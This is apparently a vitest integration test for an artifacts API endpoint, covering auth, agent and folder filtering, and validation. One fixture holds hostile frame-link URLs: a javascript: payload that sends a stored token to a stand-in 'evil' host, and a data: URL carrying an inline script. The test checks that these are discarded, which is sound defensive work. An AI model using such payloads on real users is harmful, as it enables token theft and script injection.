// artifacts-api.test.ts — integration coverage for GET /api/artifacts
// against real indexed sessions (a frame-link in the JSONL ->
// ContextAccumulator -> aggregation): auth, param validation, per-agent /
// per-folder scoping, and an honest empty result.
import { describe, it, expect, beforeEach } from 'vitest'
import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { FastifyInstance } from 'fastify'
import { claudeSessionIndex } from '../src/harnesses/claude-code/reader.js'
import { AgentRegistry } from '../src/agent-registry.js'
import { SessionStore } from '../src/session-store.js'
import { NativeStore } from '../src/native-store.js'
import { ChatService } from '../src/chat-service.js'
import { ExecService } from '../src/exec-service.js'
import { CompleteService } from '../src/complete-service.js'
import { PrefsStore } from '../src/prefs-store.js'
import { MemoryService } from '../src/memory-service.js'
import { buildServer } from '../src/server.js'

// a genuinely LOCAL request (loopback Host, no forwarding/tunnel headers)
// no longer requires a token — see isLocalRequest in server.ts. These 401
// assertions must look REMOTE (public host) so they keep exercising the
// guard without weakening it.
const REMOTE = { host: 'silos.example.com' }

let app: FastifyInstance
let base: string, root: string, dataDir: string
const TOKEN = 'testtoken'

// a minimal session with cwd + title + N artifacts (frame-link) — the real
// shape verified in context.test.ts / against the corpus.
function session(cwd: string, title: string, artifacts: { path: string; url: string; ts: string }[]): string {
  const lines: unknown[] = [
    { type: 'user', cwd, timestamp: '2026-08-20T10:00:00.000Z', message: { role: 'user', content: 'make a report' } },
    { type: 'ai-title', aiTitle: title, sessionId: 'x' },
    ...artifacts.map((a) => ({ type: 'frame-link', path: a.path, frameUrl: a.url, timestamp: a.ts })),
    { type: 'assistant', cwd, timestamp: '2026-08-20T10:00:05.000Z', message: { role: 'assistant', content: [{ type: 'text', text: 'Done.' }] } },
  ]
  return lines.map((l) => JSON.stringify(l)).join('\n') + '\n'
}

beforeEach(async () => {
  base = mkdtempSync(join(tmpdir(), 'deck-artifacts-'))
  root = join(base, 'projects')
  dataDir = join(base, 'data')
  mkdirSync(join(root, '-tmp-project-x'), { recursive: true })
  mkdirSync(join(root, '-tmp-project-y'), { recursive: true })
  mkdirSync(join(dataDir, 'trash'), { recursive: true })

  // finance agent (/tmp/project-x): 2 artifacts in s1, 0 in s2.
  writeFileSync(
    join(root, '-tmp-project-x', 's1.jsonl'),
    session('/tmp/project-x', 'FINANCE Report', [
      { path: '/tmp/out/report.html', url: 'https://claude.ai/a/1', ts: '2026-08-20T10:00:01.000Z' },
      { path: '/tmp/out/summary.md', url: 'https://claude.ai/a/2', ts: '2026-08-20T12:00:00.000Z' },
    ]),
  )
  writeFileSync(join(root, '-tmp-project-x', 's2.jsonl'), session('/tmp/project-x', 'No artifacts', []))
  // a session with HAND-CRAFTED frame-links (non-https schemes) — malicious
  // foreign data that aggregation must discard entirely.
  writeFileSync(
    join(root, '-tmp-project-x', 's4.jsonl'),
    session('/tmp/project-x', 'Foreign transcript', [
      { path: '/tmp/out/steal.html', url: "javascript:fetch('https://evil/?t='+localStorage.getItem('silos-token'))", ts: '2026-08-20T15:00:00.000Z' },
      { path: '/tmp/out/inline.html', url: 'data:text/html,<script>alert(1)</script>', ts: '2026-08-20T15:00:01.000Z' },
    ]),
  )
  // ux agent (/tmp/project-y): 1 artifact more recent than finance's.
  writeFileSync(
    join(root, '-tmp-project-y', 's3.jsonl'),
    session('/tmp/project-y', 'Dashboard UX', [{ path: '/tmp/out/dash.html', url: 'https://claude.ai/a/3', ts: '2026-08-20T14:00:00.000Z' }]),
  )

  const index = claudeSessionIndex(root, join(dataDir, 'cache.json'))
  await index.init()
  const registry = new AgentRegistry(join(dataDir, 'agents.json'))
  registry.load()
  registry.create({ id: 'finance', name: 'FINANCE', folder: '/tmp/project-x' })
  registry.create({ id: 'ux', name: 'UX', folder: '/tmp/project-y' })
  const store = new SessionStore(root, dataDir)
  const native = new NativeStore(join(dataDir, 'native.json'))
  const chat = new ChatService({
    registry,
    native,
    queryFn: () => ({
      async *[Symbol.asyncIterator]() {},
      async interrupt() {
        return undefined
      },
    }),
  })
  const exec = new ExecService(registry)
  const complete = new CompleteService(registry, index, join(base, 'skills'))
  const prefs = new PrefsStore(dataDir)
  const memory = new MemoryService(root, dataDir, registry)
  app = buildServer({ index, registry, store, native, chat, exec, complete, prefs, memory, token: TOKEN, liveMs: 120_000 })
})

const get = (url: string) => app.inject({ url, headers: { 'x-token': TOKEN } })

describe('GET /api/artifacts', () => {
  it('with no params: every indexed artifact, most recent first, with real session/agent info', async () => {
    const res = await get('/api/artifacts')
    expect(res.statusCode).toBe(200)
    const body = res.json()
    expect(body.total).toBe(3)
    expect(body.artifacts.map((a: { title: string }) => a.title)).toEqual(['dash.html', 'summary.md', 'report.html'])
    expect(body.artifacts[0]).toMatchObject({
      title: 'dash.html',
      url: 'https://claude.ai/a/3',
      path: '/tmp/out/dash.html',
      ts: '2026-08-20T14:00:00.000Z',
      sessionKey: '-tmp-project-y/s3',
      sessionTitle: 'Dashboard UX',
      agentId: 'ux',
    })
  })

  it('?agent= narrows to the classified agent', async () => {
    const body = (await get('/api/artifacts?agent=finance')).json()
    expect(body.total).toBe(2)
    expect(body.artifacts.map((a: { agentId: string }) => a.agentId)).toEqual(['finance', 'finance'])
    expect(body.artifacts.map((a: { title: string }) => a.title)).toEqual(['summary.md', 'report.html'])
  })

  it("?folder= narrows by the project's real cwd", async () => {
    const body = (await get(`/api/artifacts?folder=${encodeURIComponent('/tmp/project-y')}`)).json()
    expect(body.total).toBe(1)
    expect(body.artifacts[0]).toMatchObject({ title: 'dash.html', agentId: 'ux' })
  })

  it('a folder with no sessions: an honest empty result, never fabricated', async () => {
    const body = (await get(`/api/artifacts?folder=${encodeURIComponent('/tmp/missing')}`)).json()
    expect(body).toEqual({ artifacts: [], total: 0 })
  })

  // s4's non-https URLs never show up in the response — neither as rows
  // nor in the total (the "no params" case above already counts 3; this
  // test makes the reason explicit).
  it('javascript:/data: URLs from a foreign transcript never reach the response', async () => {
    const body = (await get('/api/artifacts')).json()
    const urls = body.artifacts.map((a: { url: string }) => a.url)
    expect(urls.every((u: string) => u.startsWith('https://'))).toBe(true)
    expect(urls.some((u: string) => u.includes('javascript:') || u.includes('data:'))).toBe(false)
    expect(body.artifacts.some((a: { title: string }) => a.title === 'steal.html' || a.title === 'inline.html')).toBe(false)
    expect(body.total).toBe(3)
  })

  // combining both filters — a real intersection.
  it('combined ?agent=&folder= filter by intersection', async () => {
    const inside = (await get(`/api/artifacts?agent=finance&folder=${encodeURIComponent('/tmp/project-x')}`)).json()
    expect(inside.total).toBe(2)
    expect(inside.artifacts.map((a: { title: string }) => a.title)).toEqual(['summary.md', 'report.html'])
    const crossed = (await get(`/api/artifacts?agent=finance&folder=${encodeURIComponent('/tmp/project-y')}`)).json()
    expect(crossed).toEqual({ artifacts: [], total: 0 })
  })

  it('404 for an unknown agent', async () => {
    expect((await get('/api/artifacts?agent=nobody')).statusCode).toBe(404)
  })

  it('400 for a non-absolute folder', async () => {
    expect((await get('/api/artifacts?folder=relative')).statusCode).toBe(400)
  })

  it('401 with no token', async () => {
    expect((await app.inject({ url: '/api/artifacts', headers: REMOTE })).statusCode).toBe(401)
  })
})
